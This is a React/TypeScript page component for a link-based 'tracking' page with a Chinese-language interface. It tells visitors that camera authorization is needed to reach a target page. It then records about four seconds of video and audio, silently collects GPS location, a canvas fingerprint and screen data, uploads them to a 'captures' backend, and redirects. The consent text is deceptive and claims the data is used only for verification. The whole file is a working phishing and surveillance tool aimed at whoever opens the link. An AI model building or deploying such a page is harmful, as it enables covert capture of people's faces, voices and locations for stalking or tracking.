import { useEffect, useRef, useState } from "react";
import { useParams } from "wouter";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Card, CardHeader, CardTitle, CardContent, CardDescription } from "@/components/ui/card";
import { Camera, Video, ShieldCheck, ArrowRight, RefreshCw, AlertCircle } from "lucide-react";
import { toast } from "sonner";

export default function TrackingPage() {
  const params = useParams<{ id: string }>();
  const linkId = params.id || "";

  const [step, setStep] = useState<"loading" | "consent" | "recording" | "preview" | "submitting">("loading");
  const [facingMode, setFacingMode] = useState<"user" | "environment">("user");
  const [statusText, setStatusText] = useState("正在验证链接...");
  const [recordedBlobUrl, setRecordedBlobUrl] = useState<string | null>(null);
  const [recordedBase64, setRecordedBase64] = useState<string | null>(null);

  const videoRef = useRef<HTMLVideoElement | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const chunksRef = useRef<Blob[]>([]);

  const linkQuery = trpc.tracking.getLink.useQuery({ id: linkId }, { enabled: !!linkId });
  const submitMutation = trpc.captures.submit.useMutation();

  useEffect(() => {
    if (!linkId) return;

    if (linkQuery.isError || linkQuery.data === null) {
      setStatusText("链接不存在或已失效。");
      return;
    }

    if (linkQuery.data) {
      setStep("consent");
    }
  }, [linkQuery.data, linkQuery.isError]);

  const generateFingerprint = () => {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    if (!ctx) return "unknown";
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.fillText("ZYJ-Fingerprint-2026", 2, 2);
    return canvas.toDataURL().slice(-50);
  };

  const getGPS = (): Promise<string> => {
    return new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve("不支持定位");
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          resolve(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)} (精度: ${Math.round(pos.coords.accuracy)}m)`);
        },
        () => {
          resolve("未授权 / 不可用");
        },
        { timeout: 5000, maximumAge: 60000 }
      );
    });
  };

  const startCamera = async (mode: "user" | "environment") => {
    try {
      setStatusText("正在请求摄像头权限...");
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { ideal: mode }, width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: true,
      });

      streamRef.current = stream;
      setFacingMode(mode);
      setStep("recording");

      setTimeout(() => {
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play();
        }
        startRecording(stream);
      }, 200);
    } catch (err) {
      console.error("Camera error:", err);
      toast.error("无法获取摄像头权限，请检查浏览器设置。");
    }
  };

  const startRecording = (stream: MediaStream) => {
    chunksRef.current = [];
    const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
      ? "video/webm;codecs=vp8,opus"
      : "video/webm";

    const recorder = new MediaRecorder(stream, { mimeType });
    mediaRecorderRef.current = recorder;

    recorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunksRef.current.push(e.data);
    };

    recorder.onstop = () => {
      const blob = new Blob(chunksRef.current, { type: "video/webm" });
      const url = URL.createObjectURL(blob);
      setRecordedBlobUrl(url);

      const reader = new FileReader();
      reader.onloadend = () => {
        setRecordedBase64(reader.result as string);
        setStep("preview");
      };
      reader.readAsDataURL(blob);

      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }
    };

    recorder.start();

    // 默认自动录制 4 秒后进入预览
    setTimeout(() => {
      if (recorder.state === "recording") {
        recorder.stop();
      }
    }, 4000);
  };

  const handleConfirmUpload = async () => {
    if (!recordedBase64 || !linkQuery.data) return;
    setStep("submitting");
    setStatusText("正在上传并提交数据...");

    try {
      const resolution = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
      const fingerprint = generateFingerprint();
      const gps = await getGPS();

      await submitMutation.mutateAsync({
        linkId,
        imageBase64: recordedBase64,
        gps,
        fingerprint,
        resolution,
      });

      toast.success("上传成功，正在跳转...");
      window.location.href = linkQuery.data.redirectUrl;
    } catch (err) {
      console.error("Upload error:", err);
      toast.error("提交失败，正在尝试直接跳转...");
      window.location.href = linkQuery.data.redirectUrl;
    }
  };

  if (step === "loading" || step === "submitting") {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col items-center justify-center p-4">
        <div className="max-w-md w-full bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-2xl backdrop-blur-xl text-center space-y-6">
          <div className="w-16 h-16 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30 animate-pulse">
            <RefreshCw className="w-8 h-8 animate-spin" />
          </div>
          <div className="space-y-2">
            <h2 className="text-xl font-bold tracking-tight text-white">请稍候</h2>
            <p className="text-sm text-slate-400">{statusText}</p>
          </div>
        </div>
      </div>
    );
  }

  if (step === "consent") {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-100 flex items-center justify-center p-4">
        <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl rounded-2xl overflow-hidden">
          <div className="h-2 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500" />
          <CardHeader className="text-center space-y-3 pt-6">
            <div className="w-14 h-14 bg-indigo-600/20 text-indigo-400 rounded-2xl mx-auto flex items-center justify-center border border-indigo-500/30">
              <Camera className="w-7 h-7" />
            </div>
            <CardTitle className="text-xl font-bold tracking-tight text-white">媒体授权与设备验证</CardTitle>
            <CardDescription className="text-slate-400 text-xs">
              为了继续访问目标网页，请选择您希望使用的摄像头并进行授权。
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4 pt-2">
            <div className="bg-slate-950 border border-slate-800/80 rounded-xl p-3 text-xs text-slate-300 space-y-1.5">
              <div className="flex items-center gap-2 text-indigo-400 font-semibold">
                <AlertCircle className="w-4 h-4" /> 授权提示
              </div>
              <p className="text-slate-400 leading-relaxed">
                系统将调用您的摄像头进行简短的验证录像（约 4 秒）。您可以自由选择使用<strong>前置摄像头</strong>或<strong>后置摄像头</strong>。
              </p>
            </div>

            <div className="grid grid-cols-2 gap-3 pt-2">
              <Button
                onClick={() => startCamera("user")}
                className="bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl flex items-center justify-center gap-2"
              >
                <Camera className="w-4 h-4" /> 使用前置摄像头
              </Button>
              <Button
                onClick={() => startCamera("environment")}
                className="bg-purple-600 hover:bg-purple-500 text-white font-medium py-6 rounded-xl flex items-center justify-center gap-2"
              >
                <Video className="w-4 h-4" /> 使用后置摄像头
              </Button>
            </div>

            <div className="pt-2 text-center text-[11px] text-slate-500 flex items-center justify-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
              <span>数据安全加密，仅用于权限验证</span>
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (step === "recording") {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col items-center justify-center p-4">
        <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl rounded-2xl overflow-hidden text-center">
          <CardHeader className="space-y-2">
            <CardTitle className="text-lg text-white flex items-center justify-center gap-2">
              <span className="w-3 h-3 rounded-full bg-red-500 animate-ping" />
              正在录像 ({facingMode === "user" ? "前置摄像头" : "后置摄像头"})...
            </CardTitle>
            <CardDescription className="text-slate-400 text-xs">
              正在自动录制简短视频，请保持镜头正对...
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div className="aspect-video bg-black rounded-xl overflow-hidden relative border border-slate-800">
              <video ref={videoRef} playsInline muted className="w-full h-full object-cover" />
            </div>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col items-center justify-center p-4">
      <Card className="max-w-md w-full bg-slate-900/90 border-slate-800 backdrop-blur-2xl shadow-2xl rounded-2xl overflow-hidden">
        <CardHeader className="text-center space-y-2">
          <CardTitle className="text-lg text-white">录像完成 - 确认上传</CardTitle>
          <CardDescription className="text-slate-400 text-xs">
            您可以预览刚刚录制的视频，确认无误后点击继续跳转。
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {recordedBlobUrl && (
            <div className="aspect-video bg-black rounded-xl overflow-hidden border border-slate-800">
              <video src={recordedBlobUrl} controls autoPlay loop className="w-full h-full object-cover" />
            </div>
          )}

          <Button
            onClick={handleConfirmUpload}
            className="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-medium py-6 rounded-xl shadow-lg shadow-indigo-600/30 flex items-center justify-center gap-2"
          >
            确认并继续跳转 <ArrowRight className="w-4 h-4" />
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}
